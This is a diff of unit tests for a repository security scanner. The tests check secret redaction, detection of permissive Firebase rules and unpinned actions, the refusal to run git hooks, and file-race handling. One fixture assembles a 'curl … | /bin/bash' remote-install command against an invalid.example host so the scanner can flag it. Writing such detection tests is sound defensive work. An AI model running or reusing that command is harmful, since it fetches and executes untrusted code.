@@ -2,17 +2,32 @@ from __future__ import annotations
 
 import base64
 import hashlib
+import importlib.util
 import json
 import os
 from pathlib import Path
 import subprocess
 import sys
 import tempfile
+import time
+import types
 import unittest
+from unittest import mock
 
 
 REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
 SCANNER = REPOSITORY_ROOT / "skill" / "vibeworthy" / "scripts" / "preflight.py"
+
+
+def load_scanner_module() -> types.ModuleType:
+    module_name = "vibeworthy_preflight_test_module"
+    specification = importlib.util.spec_from_file_location(module_name, SCANNER)
+    if specification is None or specification.loader is None:
+        raise RuntimeError("scanner module could not be loaded")
+    module = importlib.util.module_from_spec(specification)
+    sys.modules[module_name] = module
+    specification.loader.exec_module(module)
+    return module
 
 
 def synthetic_cloud_key() -> str:
@@ -169,6 +184,20 @@ class PreflightTests(unittest.TestCase):
                 self.assertIn("config.txt", completed.stdout)
                 self.assertIn("rotate", completed.stdout.lower())
 
+    def test_req_007_secret_like_filename_is_redacted_in_every_format(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
+        filename = f"token={synthetic_value}"
+        fixture.write(filename, f"token={synthetic_value}\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn(synthetic_value, completed.stdout)
+                self.assertNotIn(synthetic_value, completed.stderr)
+                self.assertIn("REDACTED", completed.stdout)
+
     def test_req_011_git_scope_env_and_skip_reasons(self) -> None:
         fixture = RepositoryFixture(self)
         synthetic_value = synthetic_cloud_key()
@@ -280,13 +309,21 @@ class PreflightTests(unittest.TestCase):
             "rules_version = '2';\nservice cloud.firestore { match /{document=**} { allow read, write: if true; } }\n",
         )
         fixture.write("database.rules.json", '{"rules": {".read": true, ".write": "true"}}\n')
+        fixture.write(
+            "storage.rules",
+            "service firebase.storage { match /b/{bucket}/o { match /{allPaths=**} { "
+            "allow read, write: if\n true; } } }\n",
+        )
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
         rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
-        self.assertEqual(2, len(rule_findings))
-        self.assertEqual({"database.rules.json", "firestore.rules"}, {finding["path"] for finding in rule_findings})
+        self.assertEqual(3, len(rule_findings))
+        self.assertEqual(
+            {"database.rules.json", "firestore.rules", "storage.rules"},
+            {finding["path"] for finding in rule_findings},
+        )
 
     def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
         fixture = RepositoryFixture(self)
@@ -333,7 +370,13 @@ class PreflightTests(unittest.TestCase):
 
     def test_req_009_missing_lock_and_remote_install_are_reported(self) -> None:
         fixture = RepositoryFixture(self)
-        remote_command = ("cu" + "rl") + " https://invalid.example/tool " + "|" + " " + ("s" + "h")
+        remote_command = (
+            ("cu" + "rl")
+            + " https://invalid.example/tool "
+            + "|"
+            + " /bin/"
+            + ("ba" + "sh")
+        )
         fixture.write(
             "package.json",
             json.dumps(
@@ -359,15 +402,88 @@ class PreflightTests(unittest.TestCase):
         fixture = RepositoryFixture(self)
         fixture.write(
             ".github/workflows/release.yml",
-            "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@" + ("a" * 40) + "\n",
+            "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@"
+            + ("a" * 40)
+            + "\n  - { uses: owner/flow-action@v4 }\n",
         )
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
         action_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-AUTOMATION-UNPINNED"]
-        self.assertEqual(1, len(action_findings))
-        self.assertEqual(2, action_findings[0]["line"])
+        self.assertEqual(2, len(action_findings))
+        self.assertEqual({2, 4}, {finding["line"] for finding in action_findings})
+
+    def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
+        fixture = RepositoryFixture(self)
+        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
+        fixture.write("config.txt", f"password={synthetic_value}\n")
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        self.assertIn(
+            "VW-SECRET-GENERIC-ASSIGNMENT",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
+        self.assertNotIn(synthetic_value, completed.stdout)
+
+    @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
+    def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("README.md", "clean\n")
+        fixture.track("README.md")
+        marker = fixture.base / "fsmonitor-executed"
+        hook = fixture.root / ".git" / "hooks" / "synthetic-fsmonitor"
+        hook.write_text(
+            "#!/bin/sh\nprintf executed > " + str(marker) + "\nexit 0\n",
+            encoding="utf-8",
+        )
+        hook.chmod(0o700)
+        subprocess.run(
+            ["git", "config", "core.fsmonitor", str(hook)],
+            cwd=fixture.root,
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(0, completed.returncode)
+        self.assertFalse(marker.exists())
+        self.assertFalse(report["scope"]["network_used"])
+        self.assertFalse(report["scope"]["files_modified"])
+
+    def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
+        scanner = load_scanner_module()
+        fixture = RepositoryFixture(self, git=False)
+        candidate_path = fixture.write("safe/data.txt", "ordinary inside content\n")
+        outside_directory = fixture.base / "outside"
+        outside_directory.mkdir()
+        outside_value = "outside-" + synthetic_cloud_key()
+        (outside_directory / "data.txt").write_text(outside_value, encoding="utf-8")
+        original_open = scanner.os.open
+        swapped = False
+
+        def swapping_open(path: object, flags: int, *args: object, **kwargs: object) -> int:
+            nonlocal swapped
+            if not swapped and Path(path) == candidate_path:
+                swapped = True
+                safe_directory = fixture.root / "safe"
+                safe_directory.rename(fixture.root / "safe-original")
+                safe_directory.symlink_to(outside_directory, target_is_directory=True)
+            return original_open(path, flags, *args, **kwargs)
+
+        report = scanner.Report()
+        candidate = scanner.Candidate(candidate_path, "safe/data.txt", None)
+        with mock.patch.object(scanner.os, "open", side_effect=swapping_open):
+            result = scanner._read_candidate(candidate, fixture.root, False, 1024, report)
+
+        self.assertIsNone(result)
+        self.assertEqual("tool.file-race", report.tool_errors[0].code)
+        rendered = scanner.render_json(report)
+        self.assertNotIn(outside_value, rendered)
 
     def test_req_011_complete_independently_approved_warning_suppression(self) -> None:
         fixture = RepositoryFixture(self)
@@ -386,7 +502,8 @@ class PreflightTests(unittest.TestCase):
         finding = report["findings"][0]
         self.assertTrue(finding["suppressed"])
         self.assertTrue(finding["suppression"]["metadata_complete"])
-        self.assertTrue(finding["suppression"]["independent_approver"])
+        self.assertTrue(finding["suppression"]["approver_identifier_distinct"])
+        self.assertFalse(finding["suppression"]["approver_independence_verified"])
         self.assertTrue(finding["suppression"]["values_redacted"])
         self.assertEqual(1, report["summary"]["suppressed_warnings"])
         self.assertEqual(1, report["summary"]["required_manual_checks"])
@@ -397,6 +514,7 @@ class PreflightTests(unittest.TestCase):
     def test_req_011_incomplete_same_owner_or_expired_suppression_fails(self) -> None:
         cases = (
             'reason="reviewed" owner="same" approved-by="same" compensating-control="rules" expires="2099-01-01"',
+            'reason="reviewed" owner="app-team" approved-by="app\u200b-team" compensating-control="rules" expires="2099-01-01"',
             'reason="reviewed" owner="app" approved-by="security" compensating-control="rules" expires="2000-01-01"',
             'reason="reviewed" owner="app" approved-by="security" expires="2099-01-01"',
         )
@@ -491,6 +609,52 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual("filesystem", report["scope"]["mode"])
         self.assertFalse(report["scope"]["git_history_scanned"])
         self.assertEqual("none", report["release_assertion"])
+
+    def test_req_010_missing_git_uses_honest_filesystem_fallback(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("README.md", "ordinary\n")
+        environment = os.environ.copy()
+        environment["PATH"] = ""
+        environment["PYTHONDONTWRITEBYTECODE"] = "1"
+
+        completed = subprocess.run(
+            [sys.executable, str(SCANNER), str(fixture.root), "--format", "json"],
+            cwd=REPOSITORY_ROOT,
+            env=environment,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
+            timeout=20,
+        )
+
+        report = self.json_report(completed)
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual("filesystem", report["scope"]["mode"])
+        self.assertEqual(["regular-files"], report["scope"]["includes"])
+        self.assertFalse(report["scope"]["git_history_scanned"])
+
+    def test_req_011_suppression_application_is_bounded(self) -> None:
+        scanner = load_scanner_module()
+        count = 12_000
+        metadata = (
+            'reason="reviewed" owner="app" approved-by="security" '
+            'compensating-control="deny rules" expires="2099-01-01"'
+        )
+        marker = f"vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}"
+        findings = [
+            scanner.Finding("VW-FIREBASE-PUBLIC-API-KEY", "config.js", line)
+            for line in range(1, count + 1)
+        ]
+        source = "\n".join(marker for _ in range(count)) + "\n"
+
+        started = time.perf_counter()
+        scanner._apply_suppressions(findings, {"config.js": source})
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
+        self.assertTrue(all(finding.suppressed for finding in findings))
 
 
 if __name__ == "__main__":
